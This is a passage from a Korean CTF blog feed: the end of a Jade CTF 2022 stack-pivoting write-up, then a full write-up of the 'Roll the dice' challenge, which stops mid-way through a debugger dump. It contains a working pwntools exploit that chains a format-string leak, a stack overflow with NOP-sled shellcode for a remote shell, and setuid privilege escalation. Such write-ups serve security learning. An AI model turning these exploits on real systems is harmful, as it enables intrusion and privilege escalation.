p64(binsh)</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;p1v0t!_p1v0t!_p1v0t!&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>다 풀고 나서 롸업 작성하는데 문제 풀 때는 못 봤던 함수를 발견했다..ㅋㅋ 이 함수를 진작에 봤더라면 더 쉽게 문제를 풀 수 있었을 텐데.. 그런데 이런 생각을 가지면 안된다. 이 문제 덕에 스택 피봇팅 리마인드했으니까~ 오히려 좋다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">hidden_level</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n&quot;</span>, <span class="number">0x4F</span>uLL);</span><br><span class="line">  result = fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Did you cheat?\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>늦장 부리다가 롸업을 너무 늦게 작성했다. 이 씨텝… 서버 오래 살아있어서 좋았는데 롸업 작성할 당시 서버가 닫혔다. 롸업은.. 제때제때 빨리빨리 작성하자 T_T.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jade CTF </tag>
            
            <tag> Stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Roll the dice (Shellcode, NOP Sled)</title>
      <link href="/221028-jadectf2022-roll_the_dice/"/>
      <url>/221028-jadectf2022-roll_the_dice/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(18&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Roll the dice, enter the coupon. Did you win? No? No worries. Try again. Life’s all about chances.</p><p>nc 34.76.206.46 10006</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">choose_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your choice: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    roll_the_dice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( coupon )                               <span class="comment">// checking the global variable for ROP</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, but you only get one chance to enter the coupon code!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      coupon = <span class="number">1</span>;</span><br><span class="line">      enter_coupon();                           <span class="comment">// only 1 time</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s too sad to see you go :(&quot;</span>);</span><br><span class="line">    quit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( quit )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> choose_option();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 함수에서 메뉴를 고를 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome To The Festive Lottery!</span><br><span class="line"></span><br><span class="line">1. Roll the dice!</span><br><span class="line">2. Enter a coupon code</span><br><span class="line">3. Exit</span><br><span class="line">Enter your choice: </span><br></pre></td></tr></table></figure><p>1번 메뉴는 <code>roll_the_dice()</code> 함수를 실행시켜준다.<br>2번 메뉴에서 여러가지 검사를 한다. coupon 전역 변수를 검사하는데, player가 한 번만 <code>enter_coupon()</code> 함수만 실행시킬 수 있다는 것을 의미한다.</p><h4 id="1-Roll-the-dice"><a href="#1-Roll-the-dice" class="headerlink" title="1. Roll the dice!"></a>1. Roll the dice!</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">roll_the_dice</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( rand() % <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Hurray! You got a 1&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congrats! You won a flag!&quot;</span>);</span><br><span class="line">      result = win();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Ah! You just missed it&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( got_6 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;Sorry, you can avail this offer only once!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        got_6 = <span class="number">1</span>;</span><br><span class="line">        another_chance = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;You get another chance to enter the coupon!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Did you tamper with the dice? This number should not be there!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case 3일때 출력해주는 저 flag는 가짜 플래그이다.</p><p>case 5의 another_chance에 주목해보자. 미리 이야기하자면 이 전역 변수는 2번 메뉴인 <code>enter_coupon()</code> 함수에서 사용된다.</p><p>got_6 전역 변수는 이런 another_chance를 단 한번만 1로 세팅할 수 있다는 것을 의미하는 것 같다.</p><h4 id="2-Enter-a-coupon-code"><a href="#2-Enter-a-coupon-code" class="headerlink" title="2. Enter a coupon code"></a>2. Enter a coupon code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">enter_coupon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> coupon_code[<span class="number">14</span>]; <span class="comment">// [rsp+70h] [rbp-70h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+7Eh] [rbp-62h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+D0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(coupon_code, <span class="string">&quot;YCHHZZHHMSHWI&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the coupon code: &quot;</span>);</span><br><span class="line">    gets(input);                                <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, coupon_code) )          <span class="comment">// same as cooupon code</span></span><br><span class="line">    &#123;</span><br><span class="line">      successfull = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Coupon applied successfully!&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid coupon code! You entered: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(input);                              <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !another_chance )                      <span class="comment">// if another_chance = 1 ?</span></span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// pass</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get one more chance to enter the coupon!&quot;</span>);</span><br><span class="line">    another_chance = <span class="number">0</span>;                         <span class="comment">// if another_chance == 1, </span></span><br><span class="line">                                                <span class="comment">// It can make another_chance = 0.</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No more chances left!&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">if</span> ( successfull != <span class="number">1</span> )                       <span class="comment">// if (input != coupon_code), I can&#x27;t do ROP.</span></span><br><span class="line">                                                <span class="comment">// =&gt; should (input == coupon_code)</span></span><br><span class="line">    choose_option();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 함수를 열어보면 bof와 fsb 취약점이 하나씩 눈에 보인다. </p><p>1번 메뉴 <code>roll_the_dice()</code> 함수에서 봤던 another_chance 전역 변수에 주목해보자. </p><p>bof가 먼저 터지고 fsb가 그 다음 터진다. 그리고 another_chance 전역 변수를 사용한다. 얘가 1이면 break가 되지 않고 while을 한 번 더 돌 수 있게 된다. 그리고 해당 전역 변수를 0으로 set한다. </p><p>이 말은 뭐다? 루프를 두 번 돌 수 있다. 즉, bof와 fsb를 한 번 더 활용할 수 있다는 뜻.</p><p>그리고 프로그램 흐름을 바꾸기 위해서 ret를 바꿔줘야하는데, 이를 위해선 함수 return을 해야한다. 코드를 보면 coupon_code를 틀리면 successfull 전역 변수가 0으로 유지되어 함수가 종료되기 전에 <code>choose_option()</code> 함수를 실행하게 된다. 그러면 안되기 때문에 coupon_code를 맞춰주어서 successfull을 1로 set해줘야한다.</p><p>마침 스택에 우리의 input 다음에 coupon_code가 위치하고 있기 때문에 굳이 input에 “YCHHZZHHMSHWI”을 적지 않아도 우회할 수 있다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>취약점은 위에서 봤듯 <code>enter_coupon()</code> 함수에서 bof와 fsb가 발생한다. canary와 pie가 걸려있기 때문에 fsb로 이것을 릭해야하는 필요성을 느낀다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>우리는 bof와 fsb가 순차적으로 두 번씩 터진다. 생각해보면, pie를 굳이 릭할 필요가 없다. 왜냐하면 NX bit disabled이기 때문에 우리는 스택에서 쉘코드를 실행시킬 수 있다.</p><p>stack 주소를 릭해서 우리의 input buf와 얼마나 떨어져있는지 offset을 구할 수 있기 때문에 return 주소를 거기로 돌려줄 수 있다.</p><p>이때 익스 확률을 높이기 위해 NOP Sled를 해줬다. 이 때 페이로드 구성은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\x00`  * (0xd0-0x62) + NOP sled + shellcode + canary + sfp + ret(input buf)</span><br></pre></td></tr></table></figure><p>input 크기와 coupon_code 크기를 합친 만큼 <code>\x00</code>을 넣어주었다. 하드코딩된 coupon_code을 맞춰서 적지 않아줘도 strcmp를 손쉽게 우회할 수 있다.</p><p>그럼 쉘코드 실행이 성공하게 되고 쉘을 획득할 수 있다. 코드 설명할 떄 언급했듯이 플래그의 위치는 정 다른 곳에 위치하고 있다. <code>ls -al *</code>을 이용해서 진짜 플래그처럼 보이는 것을 찾아보았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opt:</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 03:03 .</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 04:05 ..</span><br><span class="line">-rwxr----- 1 0 1001    36 Oct 21 05:21 real_flag.txt</span><br><span class="line">-rwsr-sr-x 1 0 1001 13440 Oct 22 03:03 worker</span><br></pre></td></tr></table></figure><p>진짜 플래그는 <code>/opt/real_flag.txt</code>에 위치하고 있다. 문제는 권한이 없어서 플래그를 읽을 수가 없다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /opt/real_flag.txt</span><br><span class="line">cat: /opt/real_flag.txt: Permission denied</span><br></pre></td></tr></table></figure><p>그래서 아래 setuid가 걸린 worker 파일을 이용해서 파일을 실행시킴으로써 권한상승을 해준 뒤에 그 권한으로 read_flag.txt를 읽어줘야 한다.</p><p>한 마디로 worker 바이너리를 익스해야 한다. 이것을 위해서 리모트의 worker 바이너리를 로컬로 복사하는 작업이 필요한데, 나는 base64를 이용해서 바이너리를 복사해주었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w0 /opt/worker </span><br></pre></td></tr></table></figure><p>로컬에서 파일 하나 만들어서 base64한 것을 붙인 다음 디코딩을 하면 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi aa</span><br><span class="line">base64 -d aa &gt; worker</span><br><span class="line">chmod +x worker</span><br></pre></td></tr></table></figure><p>이 worker 바이너리를 익스하게 되면 worker 권한으로 권한 상승이 되었기 때문에 최종적으로 real_flag.txt를 읽을 수 있다. worker 바이너리 익스는 간단하기 때문에 따로 언급하지 않겠다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><ol><li>case 5 실행할 때까지 1번 메뉴 실행</li><li>2번 메뉴에서 canary 및 stack 주소 릭한 후, input buf 주소 계산 (첫 번째 루프)</li><li>payload 구성 (두 번째 루프)<ul><li><code>\x00</code>… + NOP sled + shellcode + canary + sfp + ret(input buf) # <code>\x00</code>으로 strcmp 검사 통과</li></ul></li></ol><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><ol start="4"><li>리모트 쉘을 딴 후 &#x2F;opt&#x2F;worker 익스 진행</li><li>권한 상승 후 real_flag.txt 읽기</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter</span>(<span class="params">inp</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, inp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roll</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            want = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;You get another&#x27;</span> <span class="keyword">in</span> want:</span><br><span class="line">                <span class="built_in">print</span>(want)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">roll()</span><br><span class="line"></span><br><span class="line"><span class="comment">## canary 33</span></span><br><span class="line"></span><br><span class="line">enter(<span class="string">&#x27;%33$p %34$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;d: &#x27;</span>)</span><br><span class="line">leak = p.recvline().decode()</span><br><span class="line">canary = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary = int(p.recvline()[2:], 16)</span></span><br><span class="line">info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf = stack_leak - <span class="number">0x80</span></span><br><span class="line">info(<span class="string">&#x27;buf :: &#x27;</span> + <span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sh)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xd0</span>-<span class="number">0x62</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(sh), <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += sh</span><br><span class="line">payload += p64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PART 2 ##################################################</span></span><br><span class="line">p.sendline(<span class="string">&#x27;./opt/worker&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x40090c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span>+<span class="number">0x8</span>) </span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="shellcode를-아래처럼-구성해준-이유"><a href="#shellcode를-아래처럼-구성해준-이유" class="headerlink" title="shellcode를 아래처럼 구성해준 이유"></a>shellcode를 아래처럼 구성해준 이유</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>만하면 안되나? 왜 <code>sub rsp, 0x1000</code>을 추가했을까? </p><p>없는 경우 스택을 살펴보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────── registers ────</span><br><span class="line"></span><br><span class="line">$rsp   : 0x007ffd7b94f028  →  0x0000000000000008</span><br><span class="line">$rip   : 0x007ffd7b94f029  →  0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────── stack ────</span><br><span class="line">   0x7ffd7b94f024                  xor    esi, esi</span><br><span class="line">   0x7ffd7b94f026                  push   